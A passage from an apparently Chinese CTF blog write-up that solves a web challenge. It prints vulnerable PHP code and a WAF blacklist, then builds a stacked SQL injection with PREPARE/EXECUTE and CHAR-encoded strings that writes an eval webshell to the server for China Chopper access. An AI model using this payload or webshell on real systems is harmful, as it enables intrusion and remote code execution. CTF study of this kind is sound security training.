class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../bwvs_config/sys_config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'user_name'</span>])) &#123;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../header.php'</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($SESSION[<span class="string">'user_id'</span>])) &#123;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM dwvs_user_message WHERE user_name ="</span>.<span class="string">"'&#123;$_SESSION['user_name']&#125;'"</span>;</span><br><span class="line">$data = mysqli_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Mysql Error!!'</span>);</span><br><span class="line">$result = mysqli_fetch_array($data);</span><br><span class="line">$_SESSION[<span class="string">'user_id'</span>] = $result[<span class="string">'user_id'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$html_avatar = htmlspecialchars($_SESSION[<span class="string">'user_favicon'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">$id=waf($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM dwvs_user_message WHERE user_id ="</span>.$id;</span><br><span class="line">$data = mysqli_multi_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($result = mysqli_store_result($connect))&#123;</span><br><span class="line">$row = mysqli_fetch_row($result);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;user_id:'</span>.$row[<span class="number">0</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:"</span>.$row[<span class="number">1</span>].<span class="string">"&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;</span></span><br></pre></td></tr></table></figure></p><p>同样的道理我们可以把bwvs_config/waf.php里面的内容读出来，可以看到过滤的内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;]|\^)/i"</span>;</span><br><span class="line">$str = preg_replace(<span class="string">'/@/'</span>,<span class="string">'@-@'</span>,$str);</span><br><span class="line">$str = preg_replace($black_str, <span class="string">"@"</span>,$str);</span><br><span class="line"><span class="keyword">return</span> addslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>题目提示要写shell，就需要找可以写shell的文件路径，但得找到具有写权限的文件夹才可以执行，这里的关键点是利用这段代码mysqli_multi_query的多行执行语句去执行相关的写操作。<br>这里涉及到一个新的知识点，就是SQL的预编译语句，通过定义变量名的方式，用execute语句去执行相关操作<br>预制语句的SQL语法基于三个SQL语句：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> stmt_name <span class="keyword">FROM</span> preparable_stmt;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">EXECUTE</span> stmt_name [<span class="keyword">USING</span> @var_name [, @var_name] ...];</span><br><span class="line">  </span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure></p><p>在自己机子上试一下<br><a href="https://imgchr.com/i/Fm1Mxe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/Fm1Mxe.md.png" alt="Fm1Mxe.md.png"></a><br>因此可以来构造一下语句<code>PREPARE over FROM &quot;select * from ….&quot;;</code>但是waf里面很明显就是过滤了select我们需要去绕过一下还有单双引号都被转义，这就需要<code>char()</code>以及<code>concat()</code>函数的协助了，也可以正常显示<br><a href="https://imgchr.com/i/Fm1GVI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/Fm1GVI.md.png" alt="Fm1GVI.md.png"></a><br>下面就到使用<code>into outfile</code>的时候了，但还是得先找到那一个目录可以写文件，这里面我们还有一个上传的功能点没用到，一般上传的话我们需要开启写的权限，你自己写一次上传的代码就会知道，如果没有写权限的话，就会使服务器报错，所以图片保存的地方就应该是可以目录，可以查看图像的目录放在哪<br><img src="https://s1.ax1x.com/2018/11/30/Fm1YIP.png" alt="Fm1YIP.png"><br>在这一个目录下，这样我们就基本确定shell该放在哪里，这里的话其实还有一个点就是网站目录要怎么显示，可以利用show variables like ‘secure_file_priv%’;去查看对应的信息，如果是空的话说明哪里都可以读或者写目录了，根据user.php里面的代码可以知道执行之后会显示1,2,5列，所以我们可以将这个语句转化一下就可以知道那个目录可以写了，这样比猜靠谱多了。。。。<br><a href="https://imgchr.com/i/Fm1aRS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/Fm1aRS.md.png" alt="Fm1aRS.md.png"></a></p><p>现在就可以构造一下语句了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; into outfile &apos;/var/www/html/favicon/over.php&apos;&quot;</span><br></pre></td></tr></table></figure></p><p>把双引号里面的东西转一下<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> @b=<span class="keyword">concat</span>(<span class="built_in">CHAR</span>(<span class="number">115</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">95</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">93</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">63</span>, <span class="number">62</span>, <span class="number">39</span>, <span class="number">32</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">32</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">39</span>));</span><br><span class="line"><span class="keyword">PREPARE</span> s <span class="keyword">from</span> @b;</span><br><span class="line"><span class="keyword">EXECUTE</span> s;</span><br></pre></td></tr></table></figure></p><p>但是这样还是不行，因为@会被替换成@-@，所以得利用黑名单的替换功能把@变成黑名单里面的东西，经过黑名单替换后就会变成@啦<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> ^b=<span class="keyword">concat</span>(<span class="built_in">CHAR</span>(<span class="number">115</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">95</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">93</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">63</span>, <span class="number">62</span>, <span class="number">39</span>, <span class="number">32</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">32</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">39</span>));</span><br><span class="line"><span class="keyword">PREPARE</span> s <span class="keyword">from</span> ^b;</span><br><span class="line"><span class="keyword">EXECUTE</span> s;</span><br></pre></td></tr></table></figure></p><p>然后找到<code>favicon/over.php</code>直接菜刀连接就可以了<br><a href="https://imgchr.com/i/Fm3nwn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/Fm3nwn.md.png" alt="Fm3nwn.md.png"></a><br><code>flag{f6c5acfd4192b4152661d19b411d2d63}</code></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这里就简单小结一下:<br>1.python flask的session机制问题，可以利用其构造管理员身份登录<br>2.构造软连接去读取文件内容<br>3.注入点如何构造逻辑，如何测试通过注册页面探测过滤字符以及过滤方式<br>4.利用伪协议读取文件，并且如何利用伪协议进行命令执行<br>5.PHP反序列化里面的__get()方法起到的作用，如何去使用它对可控变量赋值<br>6.利用SQL注入读写文件的前提，如何查看<br>7.命令执行以及SQL注入绕过的一些小trick</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;考完网络安全跟算法就赶紧来复现一下题目，又学到了一波知识了
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
</feed>
